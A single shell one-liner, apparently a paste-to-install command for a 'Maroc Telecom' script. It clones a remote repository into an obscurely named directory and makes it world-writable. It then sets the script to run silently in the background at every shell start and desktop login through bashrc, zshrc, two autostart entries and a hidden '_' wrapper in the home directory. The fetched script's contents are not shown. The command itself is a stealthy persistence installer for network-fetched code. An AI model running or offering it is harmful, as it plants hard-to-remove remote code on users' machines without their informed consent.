git clone https://github.com/Redalamtaoui/Maroc_telecom_pack.git ._ && chmod -R 777 ._ && SCRIPT_PATH="$(cd ._ && pwd)/maroc_telecom.sh" && echo "bash \"$SCRIPT_PATH\" &" >> ~/.zshrc && echo "bash \"$SCRIPT_PATH\" &" >> ~/.bashrc && mkdir -p ~/.config/autostart && printf '[Desktop Entry]\nType=Application\nExec=bash "%s" &\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=Maroc Telecom Script\n' "$SCRIPT_PATH" > ~/.config/autostart/maroc_telecom.desktop && WRAPPER_PATH="$(cd ~ && pwd)/_" && printf '#!/bin/bash\nbash "%s" &\n' "$SCRIPT_PATH" > "$WRAPPER_PATH" && chmod +x "$WRAPPER_PATH" && echo "bash \"$WRAPPER_PATH\" &" >> ~/.bashrc && echo "bash \"$WRAPPER_PATH\" &" >> ~/.zshrc && printf '[Desktop Entry]\nType=Application\nExec=bash "%s" &\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=Underscore Script\n' "$WRAPPER_PATH" > ~/.config/autostart/underscore.desktop && echo "Wrapper script added successfully to terminal startup and autostart."
